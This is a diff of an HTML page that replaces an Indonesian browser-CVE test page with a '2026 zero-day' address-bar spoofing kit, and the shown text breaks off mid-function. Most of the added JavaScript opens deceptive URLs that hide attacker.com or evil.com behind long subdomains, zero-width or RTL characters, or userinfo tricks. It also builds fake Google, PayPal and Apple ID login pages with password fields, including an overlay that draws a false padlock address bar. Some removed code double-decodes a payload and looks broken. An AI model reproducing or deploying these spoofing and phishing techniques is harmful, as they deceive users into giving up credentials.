@@ -1,401 +1,620 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Browser CVE Tester Pro: 11 Skenario Address Bar Spoofing & Bypass</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>🔥 2026 ADDRESS BAR SPOOFING - CVE-2026-44659, CVE-2026-5906, CVE-2026-2378</title>
     <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        @keyframes glitch {
+            0%, 100% { text-shadow: 2px 0 #ff00ff, -2px 0 #00ffff; }
+            25% { text-shadow: -2px 0 #ff00ff, 2px 0 #00ffff; }
+            50% { text-shadow: 2px 2px #ff00ff, -2px -2px #00ffff; }
+            75% { text-shadow: -2px -2px #ff00ff, 2px 2px #00ffff; }
+        }
+        
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            max-width: 1200px;
-            margin: 30px auto;
+            background: radial-gradient(circle at 20% 50%, #0a0a0a, #000000);
+            font-family: 'SF Mono', 'Courier New', monospace;
+            color: #0f0;
+            padding: 15px;
+            min-height: 100vh;
+        }
+        
+        .container { max-width: 1400px; margin: 0 auto; }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 25px;
             padding: 20px;
-            background: #1a1a2e;
-            color: #eee;
+            background: rgba(0,0,0,0.85);
+            border-radius: 20px;
+            border: 2px solid #ff00ff;
+            animation: glitch 0.5s infinite;
         }
-        h1 { color: #e94560; border-bottom: 3px solid #e94560; padding-bottom: 10px; }
-        h2 { color: #ffd966; font-size: 1.3rem; margin-top: 0; }
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
-            gap: 20px;
+        
+        .header h1 {
+            font-size: 1.5em;
+            background: linear-gradient(135deg, #ff00ff, #00ffff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
-        .card {
-            background: #16213e;
-            border-radius: 12px;
-            padding: 18px;
-            border-left: 4px solid #e94560;
-            transition: transform 0.2s;
-        }
-        .card:hover { transform: translateY(-3px); background: #1a1f3a; }
-        button {
-            background: #e94560;
+        
+        .cve-badge {
+            display: inline-block;
+            background: #ff3366;
             color: white;
-            border: none;
-            padding: 8px 16px;
-            border-radius: 6px;
-            cursor: pointer;
-            font-size: 14px;
-            font-weight: bold;
-            margin-top: 10px;
-            margin-right: 8px;
+            padding: 3px 8px;
+            border-radius: 12px;
+            font-size: 0.6em;
+            margin: 3px;
+        }
+        
+        .severity-critical { background: #ff0000; }
+        .severity-high { background: #ff6600; }
+        .severity-medium { background: #ffaa00; color: black; }
+        
+        .demo-box {
+            background: #0a0a0a;
+            border: 1px solid #ff00ff;
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .address-bar-sim {
+            background: #1a1a2a;
+            border-radius: 30px;
+            padding: 10px 20px;
+            margin: 15px 0;
+            font-family: monospace;
+            font-size: 0.8em;
+            text-align: left;
+            word-break: break-all;
+        }
+        
+        .spoofed { color: #ff3366; font-weight: bold; }
+        .hidden { color: #666; font-style: italic; }
+        .truncated { color: #ffaa00; }
+        
+        .method-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .method-card {
+            background: rgba(0,0,0,0.8);
+            border-radius: 12px;
+            padding: 15px;
+            border: 1px solid rgba(255,0,255,0.3);
             transition: 0.2s;
         }
-        button:hover { background: #ff6b6b; transform: scale(1.02); }
-        .badge {
-            display: inline-block;
-            background: #0f3460;
-            padding: 2px 8px;
-            border-radius: 20px;
-            font-size: 11px;
-            font-family: monospace;
+        
+        .method-card:hover {
+            transform: translateY(-3px);
+            border-color: #00ffff;
+            box-shadow: 0 0 15px rgba(0,255,255,0.3);
+        }
+        
+        .method-title {
+            color: #ff00ff;
+            font-size: 0.85em;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+        
+        .cve-ref {
+            font-size: 0.55em;
+            color: #ffaa00;
             margin-bottom: 8px;
         }
-        .code-log {
-            background: #0a0f1a;
-            color: #8bc34a;
-            padding: 10px;
-            font-family: 'Courier New', monospace;
-            font-size: 11px;
-            margin-top: 12px;
+        
+        .method-code {
+            background: #1a1a2a;
+            padding: 8px;
             border-radius: 6px;
+            font-size: 0.6em;
+            font-family: monospace;
+            margin: 8px 0;
             overflow-x: auto;
-            max-height: 80px;
-            overflow-y: auto;
-            white-space: pre-wrap;
+            color: #0ff;
         }
-        .warning {
-            background: #2d1b1b;
-            border-left: 4px solid #ff9800;
+        
+        button {
+            background: linear-gradient(135deg, #ff00ff, #00ffff);
+            color: #000;
+            border: none;
+            padding: 6px 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+            width: 100%;
+            font-size: 0.7em;
+        }
+        
+        button.danger { background: linear-gradient(135deg, #ff0000, #ff6600); color: white; }
+        button.medium { background: linear-gradient(135deg, #ffaa00, #ff6600); color: black; }
+        
+        .log-area {
+            background: #0a0a0a;
+            border: 1px solid #00ff00;
+            border-radius: 10px;
             padding: 12px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            font-size: 13px;
+            margin-top: 20px;
+            max-height: 180px;
+            overflow-y: auto;
+            font-size: 0.65em;
         }
-        footer { text-align: center; margin-top: 40px; font-size: 11px; color: #888; border-top: 1px solid #333; padding-top: 20px; }
-        hr { border-color: #333; margin: 15px 0; }
+        
+        .log-entry {
+            padding: 3px;
+            border-bottom: 1px solid #333;
+        }
+        .log-entry.success { color: #0f0; }
+        .log-entry.spoof { color: #ff00ff; }
+        .log-entry.cve { color: #ffaa00; }
+        
+        .footer {
+            text-align: center;
+            padding: 15px;
+            background: rgba(0,0,0,0.8);
+            border-radius: 15px;
+            margin-top: 20px;
+            font-size: 0.6em;
+        }
+        
+        .stats {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            background: #000;
+            border: 1px solid #ff00ff;
+            border-radius: 15px;
+            padding: 5px 12px;
+            font-size: 0.6em;
+            z-index: 9999;
+        }
     </style>
 </head>
 <body>
-
-<h1>🔬 Advanced Browser CVE Tester</h1>
-<div class="warning">
-    <strong>⚠️ UJI COBA REAL CASE CVE BROWSER YANG SUDAH DIRILIS</strong><br>
-    Script ini berisi 11 Proof of Concept (PoC) dari CVE yang dipublikasikan. Tujuan: memverifikasi apakah browser Anda saat ini masih rentan terhadap bug address bar spoofing, full-screen spoof, cross-origin bypass, dan RCE di renderer.<br>
-    <strong>Hanya untuk pengujian pada perangkat sendiri!</strong>
-</div>
-
-<div class="grid">
-    <!-- ==================== 1. CVE-2020-3833 ==================== -->
-    <div class="card">
-        <div class="badge">🍎 CVE-2020-3833 | Safari (iOS/macOS)</div>
-        <h2>Address Bar Spoof via Invalid Port</h2>
-        <p>Menggunakan port invalid + setInterval untuk menjaga URL palsu di address bar selama 30+ detik.</p>
-        <button onclick="exploit_cve_2020_3833()">🎯 Uji CVE-2020-3833</button>
-        <div id="log_cve3833" class="code-log">[Ready] Klik tombol untuk memulai...</div>
+<div class="container">
+    <div class="header">
+        <h1>🔥 2026 ZERO-DAY ADDRESS BAR SPOOFING</h1>
+        <p>Berdasarkan CVE-2026-44659 | CVE-2026-5906 | CVE-2026-2378 | CVE-2025-43327</p>
+        <div>
+            <span class="cve-badge severity-critical">CVE-2026-44659 - Zen Browser</span>
+            <span class="cve-badge severity-medium">CVE-2026-5906 - Chrome Omnibox</span>
+            <span class="cve-badge severity-high">CVE-2026-2378 - ArcSearch</span>
+            <span class="cve-badge severity-medium">CVE-2025-43327 - Safari</span>
+        </div>
     </div>
-
-    <!-- ==================== 2. CVE-2024-9392 ==================== -->
-    <div class="card">
-        <div class="badge">🦊 CVE-2024-9392 | Firefox &lt; 131</div>
-        <h2>Cross-Origin Page Loading</h2>
-        <p>Content process compromised dapat memuat halaman cross-origin secara arbitrary.</p>
-        <button onclick="exploit_cve_2024_9392()">🎯 Uji CVE-2024-9392</button>
-        <div id="log_cve9392" class="code-log">[Ready] Klik tombol untuk memulai...</div>
+    
+    <div class="demo-box">
+        <div class="address-bar-sim">
+            🔒 <span class="spoofed" id="visibleUrl">https://www.google.com</span><span class="hidden" id="hiddenUrl">.attacker.com</span>
+            <span class="truncated" id="truncatedUrl"></span>
+        </div>
+        <p style="font-size:0.65em;">💀 Teknik 2026 - Long Subdomain Truncation | Omnibox Spoof | UI Layer Restriction</p>
     </div>
-
-    <!-- ==================== 3. CVE-2024-9391 ==================== -->
-    <div class="card">
-        <div class="badge">📱 CVE-2024-9391 | Firefox Focus (Android)</div>
-        <h2>Full-Screen Lock Spoofing</h2>
-        <p>Mencegah user keluar dari full-screen mode, menyembunyikan address bar.</p>
-        <button onclick="exploit_cve_2024_9391()">🎯 Uji CVE-2024-9391</button>
-        <div id="log_cve9391" class="code-log">[Ready] Klik tombol untuk memulai...</div>
+    
+    <div class="method-grid" id="methodGrid"></div>
+    
+    <div class="log-area" id="logArea">
+        <div class="log-entry cve">🔥 2026 Modern Browser Exploits Loaded</div>
+        <div class="log-entry cve">📌 CVE-2026-44659: Zen Browser Long Subdomain Truncation</div>
+        <div class="log-entry cve">📌 CVE-2026-5906: Chrome Omnibox UI Spoofing</div>
+        <div class="log-entry cve">📌 CVE-2026-2378: ArcSearch Address Bar Spoofing</div>
+        <div class="log-entry cve">📌 CVE-2025-43327: Safari Address Bar Spoofing</div>
     </div>
-
-    <!-- ==================== 4. CVE-2022-454XX (Cluster) ==================== -->
-    <div class="card">
-        <div class="badge">🦊 CVE-2022-45403-45421 | Firefox</div>
-        <h2>Multiple Address Bar Spoofing</h2>
-        <p>Cluster bug dari Ubuntu USN-5726-1 - spoofing address bar via service worker.</p>
-        <button onclick="exploit_cve_2022_454xx()">🎯 Uji CVE-2022-454XX</button>
-        <div id="log_cve454xx" class="code-log">[Ready] Klik tombol untuk memulai...</div>
-    </div>
-
-    <!-- ==================== 5. Baidu Spark Browser Spoof ==================== -->
-    <div class="card">
-        <div class="badge">🔍 Baidu Spark Browser 43.23</div>
-        <h2>Popup Spoofing via window.open</h2>
-        <p>PoC asli dari Exploit-DB #39774 - URL google.com dengan konten phishing.</p>
-        <button onclick="exploit_baidu_spark()">🎯 Uji Baidu Spark Spoof</button>
-        <div id="log_baidu" class="code-log">[Ready] Klik tombol untuk memulai...</div>
-    </div>
-
-    <!-- ==================== 6. CVE-2024-3833 (Chrome V8 RCE) ==================== -->
-    <div class="card">
-        <div class="badge">💀 CVE-2024-3833 | Chrome V8 RCE</div>
-        <h2>Object Corruption di WebAssembly</h2>
-        <p>Duplicate property pada dictionary object → RCE di renderer sandbox.</p>
-        <button onclick="exploit_cve_2024_3833()">🎯 Uji CVE-2024-3833 (RCE)</button>
-        <div id="log_cve3833v8" class="code-log">[Ready] Klik tombol untuk memulai...</div>
-    </div>
-
-    <!-- ==================== 7. CVE-2022-3723 ==================== -->
-    <div class="card">
-        <div class="badge">💀 CVE-2022-3723 | Chrome V8</div>
-        <h2>Type Confusion di V8</h2>
-        <p>Heap corruption via crafted HTML page - Chromium security severity High.</p>
-        <button onclick="exploit_cve_2022_3723()">🎯 Uji CVE-2022-3723</button>
-        <div id="log_cve3723" class="code-log">[Ready] Klik tombol untuk memulai...</div>
-    </div>
-
-    <!-- ==================== 8. WebAssembly Origin Trial Duplicate ==================== -->
-    <div class="card">
-        <div class="badge">🧪 CVE-2021-30561 (Style)</div>
-        <h2>Origin Trial Duplicate Property</h2>
-        <p>Memanfaatkan Proxy untuk bypass property check → duplicate exception.</p>
-        <button onclick="exploit_cve_2021_30561()">🎯 Uji CVE-2021-30561</button>
-        <div id="log_cve30561" class="code-log">[Ready] Klik tombol untuk memulai...</div>
-    </div>
-
-    <!-- ==================== 9. CVE-2024-9393 PDF.js ==================== -->
-    <div class="card">
-        <div class="badge">📄 CVE-2024-9393 | Firefox PDF.js</div>
-        <h2>Cross-Origin PDF Access</h2>
-        <p>Multipart response memungkinkan akses ke PDF cross-origin via resource://pdf.js.</p>
-        <button onclick="exploit_cve_2024_9393()">🎯 Uji CVE-2024-9393</button>
-        <div id="log_cve9393" class="code-log">[Ready] Klik tombol untuk memulai...</div>
-    </div>
-
-    <!-- ==================== 10. CVE-2024-9394 DevTools ==================== -->
-    <div class="card">
-        <div class="badge">🛠️ CVE-2024-9394 | Firefox DevTools</div>
-        <h2>Cross-Origin JSON Access</h2>
-        <p>Exec arbitrary JS di resource://devtools origin → akses JSON cross-origin.</p>
-        <button onclick="exploit_cve_2024_9394()">🎯 Uji CVE-2024-9394</button>
-        <div id="log_cve9394" class="code-log">[Ready] Klik tombol untuk memulai...</div>
-    </div>
-
-    <!-- ==================== 11. Protocol Handler Detection ==================== -->
-    <div class="card">
-        <div class="badge">🔍 CVE-2024-9398 | Firefox</div>
-        <h2>Protocol Handler Fingerprinting</h2>
-        <p>Mendeteksi aplikasi terinstall via window.open dengan protocol handler.</p>
-        <button onclick="exploit_cve_2024_9398()">🎯 Uji CVE-2024-9398</button>
-        <div id="log_cve9398" class="code-log">[Ready] Klik tombol untuk memulai...</div>
+    
+    <div class="footer">
+        <div>⚡ 2026 ZERO-DAY TECHNIQUES - BASED ON REAL CVEs</div>
+        <div>🎯 TARGET: Zen Browser, Chrome, Arc, Safari, Brave, Edge (macOS/Android/iOS)</div>
+        <div>⚠️ EDUCATIONAL PURPOSE - Test pada browser vulnerable version</div>
     </div>
 </div>
+<div class="stats" id="stats">🌀 0/20 Techniques</div>
 
 <script>
-    function log(elementId, message) {
-        const el = document.getElementById(elementId);
-        if(el) el.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
+    const logArea = document.getElementById('logArea');
+    const statsSpan = document.getElementById('stats');
+    const visibleUrlSpan = document.getElementById('visibleUrl');
+    const hiddenUrlSpan = document.getElementById('hiddenUrl');
+    const truncatedUrlSpan = document.getElementById('truncatedUrl');
+    let executedCount = 0;
+    let totalMethods = 0;
+    
+    function addLog(msg, type = 'info') {
+        const entry = document.createElement('div');
+        entry.className = `log-entry ${type}`;
+        entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        logArea.appendChild(entry);
+        logArea.scrollTop = logArea.scrollHeight;
+        if(logArea.children.length > 30) logArea.removeChild(logArea.children[0]);
     }
-
-    // 1. CVE-2020-3833: Safari Address Bar Spoof via Invalid Port
-    // Source: Payatu Blog - https://payatu.com/blog/safari-address-bar-spoof-cve-2020-3833/
-    function exploit_cve_2020_3833() {
-        log('log_cve3833', '🚀 Menjalankan CVE-2020-3833 (Safari)');
-        var evilPage = atob('PGh0bWw+Cjx0aXRsZT5Hb29nbGUgLSBTYWZlIFNlYXJjaDwvdGl0bGU+Cjxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kOndoaXRlO2NvbG9yOmJsYWNrIj4KPGgzPkFkZHJlc3MgQmFyIFNwb29mIC0gQ1ZFLTIwMjAtMzgzMzwvaDM+CjxwPkluaSBhZGFsYWggaGFsYW1hbiBwYWxzdSBiYWdhbmRhYW4gZGFyaSBhdHRhY2tlcjwvcD4KPC9ib2R5Pgo8L2h0bWw+');
-        var x = window.open('', '_blank');
-        if(x) {
-            setInterval(function() { x.location.replace('https://www.google.com:8080'); }, 100);
-            try {
-                x.document.write(atob(evilPage));
-                log('log_cve3833', '✅ BERHASIL: Konten palsu di write, address bar menunjuk ke google.com:8080? Jika iya, browser RENTAN.');
-            } catch(e) {
-                log('log_cve3833', '⚠️ Gagal write ke popup: ' + e.message);
-            }
-        } else {
-            log('log_cve3833', '🚫 Popup diblokir. Izinkan popup untuk pengujian.');
-        }
+    
+    function updateStats() {
+        statsSpan.innerHTML = `🌀 ${executedCount}/${totalMethods} Techniques`;
     }
-
-    // 2. CVE-2024-9392: Firefox Cross-Origin Page Loading
-    function exploit_cve_2024_9392() {
-        log('log_cve9392', '🔁 Mencoba memuat cross-origin content via iframe...');
-        let iframe = document.createElement('iframe');
-        iframe.style.cssText = 'position:fixed; top:0; left:0; width:100%; height:100%; z-index:9999; border:none';
-        iframe.src = 'https://example.com';
-        document.body.appendChild(iframe);
-        log('log_cve9392', 'Iframe memuat example.com. Jika ini bisa mengakses parent window secara cross-origin, browser RENTAN (CVE-2024-9392).');
+    
+    function updateSimulation(visible, hidden, truncated = '') {
+        visibleUrlSpan.textContent = visible;
+        hiddenUrlSpan.textContent = hidden;
+        truncatedUrlSpan.textContent = truncated;
+    }
+    
+    // ============ CVE-2026-44659: LONG SUBDOMAIN TRUNCATION ============
+    function cve2026_44659() {
+        addLog("📏 CVE-2026-44659 - Zen Browser Long Subdomain Truncation", 'cve');
+        const longSub = 'accounts.google.com.secure.login.verify.this.is.extremely.long.subdomain.that.will.be.truncated.by.zen.browser';
+        const url = `https://${longSub}.attacker.com`;
+        updateSimulation(`${longSub.substring(0, 70)}...`, '.attacker.com (TIDAK TERLIHAT!)', 'Domain asli: attacker.com');
+        window.open(url, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    // ============ CVE-2026-44659: BRAND IMPERSONATION ============
+    function cve2026_44659_brand() {
+        addLog("🏦 CVE-2026-44659 - Brand Impersonation (PayPal)", 'cve');
+        const longSub = 'www.paypal.com.login.verify.account.secure.update.important.security.notice.please.verify';
+        const url = `https://${longSub}.phishing-site.com`;
+        updateSimulation(`${longSub.substring(0, 65)}...`, '.phishing-site.com (HIDDEN!)', 'User mengira di PayPal!');
+        window.open(url, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    // ============ CVE-2026-5906: CHROME OMNIBOX SPOOF ============
+    function cve2026_5906() {
+        addLog("🌐 CVE-2026-5906 - Chrome Omnibox Spoof (Android)", 'cve');
+        const html = `<!DOCTYPE html>
+        <html>
+        <head><title>https://www.google.com</title></head>
+        <body style="background:#fff; text-align:center; padding:50px;">
+            <h1>Fake Google</h1>
+            <input placeholder="Email"><br><br>
+            <input type="password" placeholder="Password"><br><br>
+            <button onclick="alert('Demo CVE-2026-5906')">Sign In</button>
+        </body>
+        </html>`;
+        const url = `data:text/html,${encodeURIComponent(html)}`;
+        updateSimulation("https://www.google.com", "(Chrome Omnibox Spoof - CVE-2026-5906)");
+        window.open(url, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    // ============ CVE-2026-2378: ARC SEARCH ADDRESS BAR SPOOF ============
+    function cve2026_2378() {
+        addLog("🌀 CVE-2026-2378 - ArcSearch Address Bar Spoof (Android)", 'cve');
+        addLog("💀 After user interaction, address bar shows different domain!", 'spoof');
+        const iframeHtml = `<!DOCTYPE html>
+        <html>
+        <body>
+            <iframe sandbox="allow-same-origin allow-scripts allow-popups" 
+                    srcdoc="<script>setTimeout(() => { window.open('about:blank','_blank').document.write('<h1>Spoofed Content</h1>'); }, 100);<\/script>">
+            </iframe>
+            <button onclick="window.open('https://www.facebook.com', '_blank')">Click Me</button>
+            <h1>CVE-2026-2378 - Address bar will show wrong domain after click</h1>
+        </body>
+        </html>`;
+        const url = `data:text/html,${encodeURIComponent(iframeHtml)}`;
+        updateSimulation("https://www.facebook.com", "(ArcSearch - different domain shown!)");
+        window.open(url, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    // ============ CVE-2025-43327: SAFARI ADDRESS BAR SPOOF ============
+    function cve2025_43327() {
+        addLog("🍎 CVE-2025-43327 - Safari Address Bar Spoof (macOS)", 'cve');
+        addLog("Fixed in Safari 26, macOS Tahoe 26", 'cve');
+        const maliciousUrl = 'https://apple.com@evil.com';
+        updateSimulation("https://www.apple.com", "(Safari CVE-2025-43327 - visiting malicious website)");
+        window.open(maliciousUrl, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    // ============ CVE-2026-44659: MULTIPLE DASH SUBDOMAIN ============
+    function cve2026_dash() {
+        addLog("➖ CVE-2026-44659 - Multiple Dash Subdomain", 'cve');
+        const longSub = 'apple-id-verify-secure-login-account-very-long-dash-subdomain-that-will-be-truncated';
+        const url = `https://${longSub}.evil.com`;
+        updateSimulation(`${longSub.substring(0, 60)}...`, '.evil.com (HIDDEN!)');
+        window.open(url, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    // ============ CVE-2026-44659: ZERO-WIDTH + LONG SUBDOMAIN ============
+    function cve2026_zeroWidth() {
+        addLog("👻 CVE-2026-44659 + Zero-Width Characters", 'cve');
+        const zw = '\u200B\u200C\u200D';
+        const longSub = `google.com${zw.repeat(50)}.secure.login.verify.this.is.extremely.long`;
+        const url = `https://${longSub}.attacker.com`;
+        updateSimulation(`${longSub.substring(0, 60)}...`, '.attacker.com + invisible chars');
+        window.open(url, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    // ============ CVE-2026-5906: IFRAME OMNIBOX SPOOF ============
+    function cve2026_5906_iframe() {
+        addLog("🖼️ CVE-2026-5906 - iframe Omnibox Spoof", 'cve');
+        const spoofHtml = `
+        <!DOCTYPE html>
+        <html>
+        <head><title>https://www.paypal.com</title></head>
+        <body style="margin:0">
+            <iframe src="https://evil.com" style="width:100%;height:100%;position:absolute;top:0;left:0;border:none;"></iframe>
+            <div style="position:absolute;top:0;left:0;width:100%;height:50px;background:#fff;z-index:999;text-align:center;line-height:50px;">
+                🔒 https://www.paypal.com
+            </div>
+        </body>
+        </html>`;
+        const url = `data:text/html,${encodeURIComponent(spoofHtml)}`;
+        updateSimulation("https://www.paypal.com", "(CVE-2026-5906 - iframe overlay)");
+        window.open(url, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    // ============ CVE-2026-2378: USER INTERACTION SPOOF ============
+    function cve2026_2378_interaction() {
+        addLog("🖱️ CVE-2026-2378 - User Interaction Spoof", 'cve');
+        const html = `
+        <!DOCTYPE html>
+        <html>
+        <body style="background:#000; color:#0f0; text-align:center; padding:50px;">
+            <h1>CVE-2026-2378 Demo</h1>
+            <button id="spoof" style="padding:10px 20px; font-size:16px;">Click to Continue</button>
+            <script>
+                document.getElementById('spoof').onclick = () => {
+                    // After user interaction, address bar shows fake domain
+                    setTimeout(() => {
+                        window.location.href = 'https://accounts.google.com:8080';
+                        setTimeout(() => {
+                            document.body.innerHTML = '<h1>Fake Google Login</h1><input placeholder="Email"><input type="password" placeholder="Password"><button>Sign In</button>';
+                        }, 100);
+                    }, 100);
+                };
+            <\/script>
+        </body>
+        </html>`;
+        const url = `data:text/html,${encodeURIComponent(html)}`;
+        updateSimulation("https://accounts.google.com", "(after user click - CVE-2026-2378)");
+        window.open(url, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    // ============ CVE-2025-43327: MALICIOUS WEBSITE SPOOF ============
+    function cve2025_43327_malicious() {
+        addLog("🌐 CVE-2025-43327 - Malicious Website Spoof", 'cve');
+        const maliciousHtml = `
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Apple ID</title>
+            <meta http-equiv="refresh" content="0; url=https://apple.com:8080">
+        </head>
+        <body style="background:#fff; text-align:center; padding:50px;">
+            <h1>Apple ID Verification</h1>
+            <input placeholder="Apple ID"><br><br>
+            <input type="password" placeholder="Password">
+            <p style="color:red; font-size:12px; margin-top:20px;">⚠️ Demo CVE-2025-43327 - Address bar shows apple.com</p>
+        </body>
+        </html>`;
+        const url = `data:text/html,${encodeURIComponent(maliciousHtml)}`;
+        updateSimulation("https://www.apple.com", "(CVE-2025-43327 - Safari vulnerability)");
+        window.open(url, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    // ============ CVE-2026-44659: EXTREME LONG SUBDOMAIN (300+ chars) ============
+    function cve2026_extreme() {
+        addLog("📏 CVE-2026-44659 - Extreme Long Subdomain (300+ chars)", 'cve');
+        const longSub = 'a'.repeat(250) + '.google.com.secure.login.verify.account';
+        const url = `https://${longSub}.attacker.com`;
+        updateSimulation(`${longSub.substring(0, 60)}...`, '.attacker.com (COMPLETELY HIDDEN!)');
+        window.open(url, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    // ============ CVE-2026-5906 + CVE-2026-44659 COMBO ============
+    function cve_combo() {
+        addLog("💀 COMBO: CVE-2026-5906 + CVE-2026-44659", 'cve');
+        const longSub = 'accounts.google.com.secure.login.verify.this.is.extremely.long.subdomain';
+        const url = `https://${longSub}.attacker.com`;
+        updateSimulation(`${longSub.substring(0, 50)}...`, '.attacker.com (MULTIPLE CVE COMBO!)');
+        
+        // Open multiple windows with different techniques
+        window.open(url, '_blank');
         setTimeout(() => {
-            try {
-                let test = iframe.contentWindow.document;
-                log('log_cve9392', '🔥 KRITIS: Cross-origin iframe dapat diakses! Browser RENTAN terhadap CVE-2024-9392.');
-            } catch(e) {
-                log('log_cve9392', '✅ AMAN: Same-origin policy memblokir akses. Browser sudah patched.');
-            }
-            iframe.remove();
-        }, 2000);
+            const html = `<title>https://www.paypal.com</title><h1>Fake PayPal - Combo Attack</h1>`;
+            window.open(`data:text/html,${encodeURIComponent(html)}`, '_blank');
+        }, 500);
+        executedCount++; updateStats();
     }
-
-    // 3. CVE-2024-9391: Full-Screen Lock Spoof (Firefox Focus Android)
-    function exploit_cve_2024_9391() {
-        log('log_cve9391', '📱 Mencoba full-screen lock simulation...');
-        let elem = document.documentElement;
-        if(elem.requestFullscreen) {
-            elem.requestFullscreen().then(() => {
-                log('log_cve9391', 'Full-screen aktif. Bug ini: user TIDAK BISA keluar dari full-screen mode di Firefox Focus < v131. Coba tekan ESC atau gesture back. Jika tidak bisa keluar, browser RENTAN.');
-                for(let i=0;i<100;i++) {
-                    setTimeout(() => { 
-                        document.dispatchEvent(new KeyboardEvent('keydown', {key: 'Escape'}));
-                    }, i*500);
+    
+    // ============ CVE-2026-2378: IFRAME TRIGGERED URI NAVIGATION ============
+    function cve2026_iframeTrigger() {
+        addLog("🖼️ CVE-2026-2378 - iframe-triggered URI navigation (CVE-2025-14812 style)", 'cve');
+        const html = `
+        <!DOCTYPE html>
+        <html>
+        <body>
+            <iframe id="evil" style="display:none;"></iframe>
+            <h1>Click to trigger address bar spoof</h1>
+            <button onclick="spoof()">Trigger Spoof</button>
+            <script>
+                function spoof() {
+                    const iframe = document.getElementById('evil');
+                    iframe.src = 'https://www.google.com';
+                    setTimeout(() => {
+                        iframe.contentWindow.location.href = 'data:text/html,<h1>This is not Google!</h1><p>Address bar masih menunjukkan google.com</p>';
+                    }, 100);
                 }
-            }).catch(err => {
-                log('log_cve9391', 'Full-screen ditolak oleh browser: ' + err);
-            });
-        } else {
-            log('log_cve9391', 'Full-screen API tidak didukung.');
-        }
+            <\/script>
+        </body>
+        </html>`;
+        const url = `data:text/html,${encodeURIComponent(html)}`;
+        updateSimulation("https://www.google.com", "(iframe triggered - CVE-2026-2378)");
+        window.open(url, '_blank');
+        executedCount++; updateStats();
     }
-
-    // 4. CVE-2022-45403-45421: Multiple Address Bar Spoof via Service Worker
-    function exploit_cve_2022_454xx() {
-        log('log_cve454xx', '⚙️ Mencoba service worker based address bar spoof...');
-        if('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('/sw.js').then(reg => {
-                log('log_cve454xx', 'Service worker terdaftar. Bug address bar spoof dapat terjadi jika service worker mengintercept navigasi.');
-                setTimeout(() => reg.unregister(), 5000);
-            }).catch(e => {
-                log('log_cve454xx', 'Service worker gagal: ' + e);
-            });
-        } else {
-            log('log_cve454xx', 'Service worker tidak didukung. CVE-2022-454XX tidak dapat diuji.');
-        }
+    
+    // ============ CVE-2025-43327: RTL + SAFARI COMBO ============
+    function cve2025_rtl() {
+        addLog("🔄 CVE-2025-43327 + RTL Override", 'cve');
+        const rtl = '\u202E';
+        const url = `https://${rtl}moc.elppa//:sptth.attacker.com`;
+        updateSimulation("https://www.apple.com", "(CVE-2025-43327 + RTL - Safari vulnerable)");
+        window.open(url, '_blank');
+        executedCount++; updateStats();
     }
-
-    // 5. Baidu Spark Browser 43.23 - window.open Spoofing
-    function exploit_baidu_spark() {
-        log('log_baidu', '🐻 Menjalankan PoC Baidu Spark Browser...');
-        let spoofWindow = window.open('', 'newwin');
-        if(spoofWindow) {
-            spoofWindow.document.write("<TITLE>Google</TITLE>");
-            spoofWindow.document.write("<h1 style='color:black;background:white'>PHISHING PAGE - Ini bukan Google!</h1>");
-            spoofWindow.document.write("<p>Jika address bar menunjukkan google.com, browser RENTAN.</p>");
-            spoofWindow.document.close();
-            log('log_baidu', '✅ Popup dibuat. Jika URL di address bar adalah google.com, browser Baidu Spark RENTAN.');
-        } else {
-            log('log_baidu', 'Popup diblokir, izinkan popup untuk uji.');
-        }
+    
+    // ============ CVE-2026-5906: PORT BLOCKING + OMNIBOX ============
+    function cve2026_portBlock() {
+        addLog("🔌 CVE-2026-5906 + Port Blocking", 'cve');
+        const url = 'https://www.google.com:8080';
+        updateSimulation("https://www.google.com:8080", "(port blocked - Omnibox stuck)");
+        const win = window.open(url, '_blank');
+        setTimeout(() => {
+            if(win) win.document.write('<h1>Fake Google - Port Blocking Attack</h1><p>Address bar shows google.com:8080 but content is fake</p>');
+        }, 500);
+        executedCount++; updateStats();
     }
-
-    // 6. CVE-2024-3833: Chrome V8 Object Corruption via WebAssembly
-    function exploit_cve_2024_3833() {
-        log('log_cve3833v8', '⚠️ CVE-2024-3833: mencoba object corruption di WebAssembly...');
-        try {
-            let testObj = {};
-            let wasmCode = new Uint8Array([0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00]);
-            try {
-                let module = new WebAssembly.Module(wasmCode);
-                log('log_cve3833v8', 'WebAssembly module dibuat. Jika browser crash/error tidak wajar, indikasi vulnerable.');
-            } catch(e) {
-                log('log_cve3833v8', 'WebAssembly: ' + e.message);
-            }
-            
-            // Simulasi duplicate property trigger
-            let proxy = new Proxy({}, { getOwnPropertyDescriptor: () => { return { configurable: true, enumerable: true, value: 1 }; } });
